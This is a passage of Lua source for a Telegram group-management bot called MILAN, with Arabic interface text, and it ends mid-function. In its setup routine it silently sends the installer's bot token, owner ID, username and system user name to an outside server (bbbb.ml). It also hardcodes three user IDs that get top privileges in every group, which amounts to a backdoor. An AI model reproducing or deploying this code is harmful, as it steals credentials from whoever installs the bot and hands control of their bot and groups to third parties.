redis = require('redis') 
https = require ("ssl.https") 
serpent = dofile("./library/serpent.lua") 
json = dofile("./library/JSON.lua") 
JSON  = dofile("./library/dkjson.lua")
URL = require('socket.url')  
utf8 = require ('lua-utf8') 
database = redis.connect('127.0.0.1', 6379) 
id_server = 2342443
--------------------------------------------------------------------------------------------------------------
local AutoSet = function() 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    
file:close()  
end  
if not database:get(id_server..":token") then
io.write('\27[0;31m\n »» Send Your Token Bot :\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[1;31m»» Sorry The Token is not Correct ')
else
io.write('\27[0;32m »» The Token Is Saved\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[1;31m»»The Token was not Saved')
end 
os.execute('lua MILAN.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;31m\n »» Send Your Id Sudo : \n\27[0;33;49m')
local SUDOID = io.read()
if SUDOID ~= '' then
io.write('\27[0;32m »» The Id Is Saved \n27[0;39;49m')
database:set(id_server..":SUDO:ID",SUDOID)
else
print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end 
os.execute('lua MILAN.lua')
end
if not database:get(id_server..":SUDO:USERNAME") then
io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
else
print('\n\27[1;34m لم يتم حفظ معرف المطور :')
end 
os.execute('lua MILAN.lua')
end
local create_config_auto = function()
config = {
token = database:get(id_server..":token"),
SUDO = database:get(id_server..":SUDO:ID"),
UserName = database:get(id_server..":SUDO:USERNAME"),
 }
create(config, "./Info.lua")   
end 
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
https.request('http://bbbb.ml/MILAN/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("MILAN", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/MILAN
token="]]..database:get(id_server..":token")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "TG IS NOT FIND IN FILES BOT"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
exit 1
fi
echo -e "\033[38;5;208m"
echo -e "                                                  "
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./MILAN.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("MA", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/MILAN
while(true) do
rm -fr ../.telegram-cli
screen -S MILAN -X kill
screen -S MILAN ./MILAN
done
]])  
file:close() 
os.execute('rm -fr $HOME/.telegram-cli')
end 
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "Info"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
local load_redis = function()  
local f = io.open("./Info.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
database:del(id_server..":token")
database:del(id_server..":SUDO:ID")
end  
local config = loadfile("./Info.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
print([[

┏┓━━━━━━━━━━━┏┓━━━━━━━━━━━
┃┃━━━━━━━━━━━┃┃━━━━━━━━━━━
┃┗━┓┏━━┓┏┓━┏┓┃┃┏┓┏━━┓━┏┓┏┓
┃┏┓┃┃┏┓┃┃┃━┃┃┃┗┛┛┗━┓┃━┗╋╋┛
┃┗┛┃┃┗┛┃┃┗━┛┃┃┏┓┓┃┗┛┗┓┏╋╋┓
┗━━┛┗━━┛┗━┓┏┛┗┛┗┛┗━━━┛┗┛┗┛
━━━━━━━━┏━┛┃━━━━━━━━━━━━━━
━━━━━━━━┗━━┛━━━━━━━━━━━━━━

> CH › @R_IQ9
]])
sudos = dofile("./Info.lua") 
SUDO = tonumber(sudos.SUDO)
sudo_users = {SUDO}
bot_id = sudos.token:match("(%d+)")  
token = sudos.token 
--- start functions ↓
--------------------------------------------------------------------------------------------------------------
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
sudo_users = {SUDO,267509943,1190102832,1033759718}   
function SudoBot(msg)  
local MILAN = false  
for k,v in pairs(sudo_users) do  
if tonumber(msg.sender_user_id_) == tonumber(v) then  
MILAN = true  
end  
end  
return MILAN  
end 
function Sudo(msg) 
local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
if hash or SudoBot(msg) then  
return true  
else  
return false  
end  
end
function Mamez(msg) 
local hash = database:sismember(bot_id..'Mamez:User', msg.sender_user_id_) 
if hash or SudoBot(msg) or Sudo(msg) then  
return true  
else  
return false  
end  
end
function BasicConstructor(msg)
local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or Sudo(msg) then 
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or Sudo(msg) or BasicConstructor(msg) then    
return true    
else    
return false    
end 
end
function Manager(msg)
local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) then    
return true    
else    
return false    
end 
end
function cleaner(msg)
local hash = database:sismember(bot_id.."VVVZVV:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) then     
return true    
else    
return false    
end 
end
function Mod(msg)
local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) then    
return true    
else    
return false    
end 
end
function Special(msg)
local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
if hash or SudoBot(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) then    
return true 
else 
return false 
end 
end
function Can_or_NotCan(user_id,chat_id)
if tonumber(user_id) == tonumber(267509943) then  
var = true  
elseif tonumber(user_id) == tonumber(1190102832) then
var = true  
elseif tonumber(user_id) == tonumber(1033759718) then
var = true  
elseif tonumber(user_id) == tonumber(SUDO) then  
var = true  
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = true  
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'VVVZVV:MN:TF'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = true  
elseif database:sismember(bot_id..'Mamez:User'..chat_id, user_id) then  
var = true 
else  
var = false  
end  
return var
end 

function Rutba(user_id,chat_id)
if tonumber(user_id) == tonumber(267509943) then  
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(1190102832) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(1033759718) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البوت🤖'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المطور'  
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = database:get(bot_id.."BasicConstructor:Rd"..msg.chat_id_) or 'المنشئ اساسي'
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'المنشئ'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'المدير'  
elseif database:sismember(bot_id..'VVVZVV:MN:TF'..chat_id, user_id) then
var = 'منظف' 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'الادمن'  
elseif database:sismember(bot_id..'Mamez:User', user_id) then
var = database:get(bot_id.."Mamez:Rd"..msg.chat_id_) or 'مميز عام'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'المميز'  
else  
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'العضو'
end  
return var
end 
function ChekAdd(chat_id)
if database:sismember(bot_id.."Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_User(Chat_id,User_id) 
if database:sismember(bot_id..'Muted:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function Ban_User(Chat_id,User_id) 
if database:sismember(bot_id..'Ban:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function GBan_User(User_id) 
if database:sismember(bot_id..'GBan:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function Gmute_User(User_id) 
if database:sismember(bot_id..'Gmute:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function AddChannel(User)
local var = true
if database:get(bot_id..'add:ch:id') then
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..database:get(bot_id..'add:ch:id').."&user_id="..User);
data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
end
end
return var
end

function dl_cb(a,d)
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function chat_kick(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function PinMessage(chat, id)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(chat).ID,
message_id_ = id,
disable_notification_ = 0
},function(arg,data) 
end,nil)
end
function UnPinMessage(chat)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(chat).ID
},function(arg,data) 
end,nil)
end
local function GetChat(chat_id) 
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
},cb, nil) 
end  
function getInputFile(file) 
if file:match('/') then infile = {ID = "InputFileLocal", path_ = file} elseif file:match('^%d+$') then infile = {ID = "InputFileId", id_ = file} else infile = {ID = "InputFilePersistentId", persistent_id_ = file} end return infile 
end
function ked(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
local function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end
local function GetInputFile(file)  
local file = file or ""   if file:match('/') then  infile = {ID= "InputFileLocal", path_  = file}  elseif file:match('^%d+$') then  infile = {ID= "InputFileId", id_ = file}  else  infile = {ID= "InputFilePersistentId", persistent_id_ = file}  end return infile 
end
local function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra) 
tdcli_function ({  ID = request_id,    chat_id_ = chat_id,    reply_to_message_id_ = reply_to_message_id,    disable_notification_ = disable_notification,    from_background_ = from_background,    reply_markup_ = reply_markup,    input_message_content_ = input_message_content,}, callback or dl_cb, extra) 
end
local function sendAudio(chat_id,reply_id,audio,title,caption)  
tdcli_function({ID="SendMessage",  chat_id_ = chat_id,  reply_to_message_id_ = reply_id,  disable_notification_ = 0,  from_background_ = 1,  reply_markup_ = nil,  input_message_content_ = {  ID="InputMessageAudio",  audio_ = GetInputFile(audio),  duration_ = '',  title_ = title or '',  performer_ = '',  caption_ = caption or ''  }},dl_cb,nil)
end  
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) 
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = disable_notification,from_background_ = from_background,reply_markup_ = reply_markup,input_message_content_ = {ID = "InputMessageDocument",document_ = getInputFile(document),caption_ = caption},}, dl_cb, cmd) 
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)  
local input_message_content = {   ID = "InputMessageVoice",   voice_ = getInputFile(voice),  duration_ = duration or 0,   waveform_ = waveform,    caption_ = caption  }  sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo,caption)   
tdcli_function ({ ID = "SendMessage",   chat_id_ = chat_id,   reply_to_message_id_ = reply_to_message_id,   disable_notification_ = disable_notification,   from_background_ = from_background,   reply_markup_ = reply_markup,   input_message_content_ = {   ID = "InputMessagePhoto",   photo_ = getInputFile(photo),   added_sticker_file_ids_ = {},   width_ = 0,   height_ = 0,   caption_ = caption  },   }, dl_cb, nil)  
end
function Total_Msg(msgs)  
local MILAN_Msg = ''  
if msgs < 100 then 
MILAN_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
MILAN_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
MILAN_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
MILAN_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
MILAN_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
MILAN_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
MILAN_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
MILAN_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
MILAN_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
MILAN_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
MILAN_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
MILAN_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
MILAN_Msg = 'رب التفاعل '  
end 
return MILAN_Msg 
end
function GetFile_Bot(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'MILAN Chat'
link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
MNSH = database:smembers(bot_id..'Constructor'..v)
MDER = database:smembers(bot_id..'Manager'..v)
MOD = database:smembers(bot_id..'Mod:User'..v)
if k == 1 then
t = t..'"'..v..'":{"MILAN":"'..NAME..'",'
else
t = t..',"'..v..'":{"MILAN":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '📋┇ عدد مجموعات التي في البوت { '..#list..'}')
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function AddFile_Bot(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_,"܁༯┆هلو عمري ↝ ܰ\n܁༯ ┆ملف نسخه ليس لهاذا البوت ↝ ܰ")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_,"܁༯┆جاري رفع الملف الان . . .")
else
send(chat,msg.id_,"܁༯┆ عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح . .! ")   
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
for idg,v in pairs(groups.GP_BOT) do
database:sadd(bot_id..'Chek:Groups',idg)  
database:set(bot_id..'lock:tagservrbot'..idg,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..idg,'del')    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id..'Constructor'..idg,idmsh)
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id..'Manager'..idg,idmder)  
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id..'Mod:User'..idg,idmod)  
end
end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id..'Basic:Constructor'..idg,idASAS)  
end
end
end
send(chat,msg.id_,"\n܁༯┆ههلو عمري  ↝ ܰ\n܁༯┆تم رفع الملف وتفعيل المجموعات  \n܁༯┆ورفع ◞المنشئين الاساسيين ܊ المنشئين ܊ المدراء ܊ الادمنية ◜ بنجاح")   
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n܁༯┆العـضو '..Name..' ↝ ܰ\n܁༯┆قام بالتكرار هنا وتم ◃ طرده ↝ ܰ'  
sendText(msg.chat_id_,Text,0,'md')
chat_kick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if type == 'del' then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
end 
if type == 'keed' then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '\n܁༯┆العـضو '..Name..' ↝ ܰ\n܁༯┆قام بالتكرار هنا وتم ◃ تقييده ↝ ܰ'  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n܁༯┆العـضو '..Name..' ↝ ܰ\n܁༯┆قام بالتكرار هنا وتم ◃ كتمه ↝ ܰ'  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end,nil)   
end  
function plugin_MILANa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.MILANa and msg then
pre_msg = plugin.MILANa(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg)  
end

--------------------------------------------------------------------------------------------------------------
function SourceMILAN(msg,data) -- بداية العمل
if msg then
local text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'User_Bot',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end
if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "• الغاء × ." then   
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء الاذاعه ↝ ܰ") 
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
database:set(bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_,"܁༯┆تم الاذاعة الى ◃ ˼ "..#list.." ˹  مجموعات في البوت ↝ ܰ")     
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then
if text == '/start' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if SudoBot(msg) then
local bl = '゠اهلا بيك عمري ↝⸼ .\n゠انت المطور الاساسي للبوت 𖧧.\n゠تستطيع التحكم باوامر البوت 𖧧.\n゠من خلال الكيبورد الخاص بك 𖧧.\n゠قناة السورس  ◝ [@R_IQ9] ◟ .'
local keyboard = {
	{'• وضع اسم الى البوت 𖠹 .'},
{'• تعطيل التواصل  × .','• تفعيل التواصل  𖡩 .'},
{'• الاحصائيات 𖡬 .'},
{'• المشتركيين 𖡹 .','• المجموعات 𖡹 .'},
{'• المطورين 𖤂 .','• قائمة العام 𖤹 .'},
{'• وضع كليشة 𖡲 start  .','• حذف كليشة 𖡲 start  .'},
{'• اذاعة في الخاص 𖡮  .','• اذاعة 𖡮  .'},
{'• اذاعة بالتوجية في الخاص 𖣮  .','• اذاعة بالتوجية  𖣮  .'},
{'• الاشتراك الاجباري 𖤫 . '},
{'• تغير رسالة الاشتراك 𖤩  .','• حذف رسالة الاشتراك 𖤩  .'},
{'• وضع قناة الاشتراك 𖤫  .','• تغير الاشتراك 𖤩  .'},
{'• تعطيل الاشتراك 𖤤  .','• تفعيل الاشتراك 𖤤  .'},
{'• تنظيف المشتركيين 𖤸 .','• تنظيف الكروبات 𖤸 .'},
{'• تفعيل البوت الخدمي 𖤴 .','• تعطيل البوت الخدمي 𖤴 .'},
{'• جلب النسخة الاحتياطية 𖥠 .'},
{'• معلومات السيرفر 𖥠 .'}, 
{'• تحديث السورس ᜱ .'}, 
{'• الغاء × .'}
}
send_inline_key(msg.chat_id_,bl,keyboard)
else
if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
